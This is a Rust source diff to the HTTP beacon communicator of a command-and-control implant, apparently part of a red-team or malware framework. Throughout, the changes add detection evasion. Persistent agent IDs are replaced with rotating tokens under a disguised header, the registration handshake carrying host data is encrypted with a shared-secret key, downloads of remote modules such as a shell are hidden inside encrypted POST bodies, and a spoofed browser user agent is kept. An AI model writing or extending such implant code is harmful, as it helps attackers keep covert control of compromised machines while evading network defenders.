@@ -17,6 +17,10 @@ pub struct RegisterOutcome {
     pub session_key: Option<Vec<u8>>,
     pub heartbeat_path: String,
     pub result_path: String,
+    /// Opaque per-session channel token issued by the server. Sent instead of
+    /// the stable agent id on subsequent requests so the beacon carries no
+    /// persistent identifier (rotates on every registration).
+    pub session_token: Option<String>,
 }
 
 /// HTTP communicator for beacon-style communication with the C2 server.
@@ -26,6 +30,7 @@ pub struct HttpCommunicator {
     register_path: String,
     heartbeat_path: String,
     result_path: String,
+    session_token: Option<String>,
 }
 
 impl HttpCommunicator {
@@ -39,7 +44,7 @@ impl HttpCommunicator {
             .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
             .build()
             .unwrap_or_else(|e| {
-                eprintln!("[http] Failed to create HTTP client with custom UA, using default: {}", e);
+                libra_common::dlog!("[http] Failed to create HTTP client with custom UA, using default: {}", e);
                 Client::new()
             });
 
@@ -49,7 +54,13 @@ impl HttpCommunicator {
             register_path: register_path.to_string(),
             heartbeat_path: heartbeat_path.to_string(),
             result_path: result_path.to_string(),
+            session_token: None,
         }
+    }
+
+    /// Adopt the per-session channel token issued at registration.
+    pub fn set_session_token(&mut self, token: String) {
+        self.session_token = Some(token);
     }
 
     fn register_url(&self) -> String {
@@ -64,9 +75,24 @@ impl HttpCommunicator {
         format!("{}{}", self.server_url, self.result_path)
     }
 
+    /// Build the identity header for a beacon request: the per-session token
+    /// when available (opaque, rotates), falling back to the stable agent id
+    /// for servers that predate session tokens.
+    fn identity_header(&self, agent_id: &str) -> (&'static str, String) {
+        match &self.session_token {
+            Some(t) if !t.is_empty() => ("X-Request-Id", t.clone()),
+            _ => ("X-Agent-Id", agent_id.to_string()),
+        }
+    }
+
     /// Register with the C2 server and adopt the profile paths it returns.
     /// Returns the assigned agent_id, the RSA-encrypted AES session key (if
     /// any), and the heartbeat/result paths to use going forward.
+    ///
+    /// When a beacon secret is configured, the registration body is encrypted
+    /// with a pre-session AES key derived from the secret (SHA-256), so the
+    /// handshake never carries the agent's RSA public key or host metadata in
+    /// plaintext. The server decrypts with the same derivation.
     pub async fn register(
         &mut self,
         hostname: &str,
@@ -98,11 +124,23 @@ impl HttpCommunicator {
             if has_session_key { "true" } else { "false" }
         );
 
+        // Encrypt the handshake with the pre-session key derived from the
+        // shared beacon secret (no key exchange needed — both sides know it).
+        let body = if beacon_secret.is_empty() {
+            json
+        } else {
+            let pre_key = libra_crypto::derive_pre_session_key(beacon_secret);
+            format!(
+                r#"{{"payload":"{}"}}"#,
+                libra_crypto::encrypt_payload(&json, &pre_key)
+            )
+        };
+
         let resp = self
             .client
             .post(self.register_url())
             .header("Content-Type", "application/json")
-            .body(json)
+            .body(body)
             .send()
             .await
             .map_err(|e| e.to_string())?;
@@ -130,11 +168,15 @@ impl HttpCommunicator {
             }
         }
 
+        let session_token = extract_string(&body, "session_token");
+        self.session_token = session_token.clone();
+
         Ok(RegisterOutcome {
             agent_id,
             session_key,
             heartbeat_path: self.heartbeat_path.clone(),
             result_path: self.result_path.clone(),
+            session_token,
         })
     }
 
@@ -160,10 +202,11 @@ impl HttpCommunicator {
             None => "{}".to_string(),
         };
 
+        let (id_header, id_value) = self.identity_header(agent_id);
         let resp = self
             .client
             .post(self.heartbeat_url())
-            .header("X-Agent-Id", agent_id)
+            .header(id_header, id_value)
             .header("Content-Type", "application/json")
             .body(body)
             .send()
@@ -221,9 +264,10 @@ impl HttpCommunicator {
             None => result_json.to_string(),
         };
 
+        let (id_header, id_value) = self.identity_header(agent_id);
         self.client
             .post(self.result_url())
-            .header("X-Agent-Id", agent_id)
+            .header(id_header, id_value)
             .header("Content-Type", "application/json")
             .body(body)
             .send()
@@ -233,19 +277,29 @@ impl HttpCommunicator {
     }
 
     /// Download a cloud module (e.g. "shell") as raw bytes.
-    /// The response is AES-GCM encrypted with the session key and wrapped in
-    /// `{ "payload": "<base64>" }`.
+    /// The request is an AES-GCM encrypted envelope `{ "payload": "<base64>" }`
+    /// containing the module name — no plaintext module name on the wire. The
+    /// response is encrypted with the session key in the same envelope.
     pub async fn download_module(
         &self,
         name: &str,
         agent_id: &str,
         session_key: &[u8; AES_KEY_SIZE],
     ) -> Result<Vec<u8>, String> {
-        let url = format!("{}/api/beacon/module/{}", self.server_url, name);
+        let url = format!("{}/api/beacon/module", self.server_url);
+        let inner = format!(r#"{{"name":"{}"}}"#, escape(name));
+        let body = format!(
+            r#"{{"payload":"{}"}}"#,
+            libra_crypto::encrypt_payload(&inner, session_key)
+        );
+
+        let (id_header, id_value) = self.identity_header(agent_id);
         let resp = self
             .client
-            .get(&url)
-            .header("X-Agent-Id", agent_id)
+            .post(&url)
+            .header(id_header, id_value)
+            .header("Content-Type", "application/json")
+            .body(body)
             .send()
             .await
             .map_err(|e| e.to_string())?;
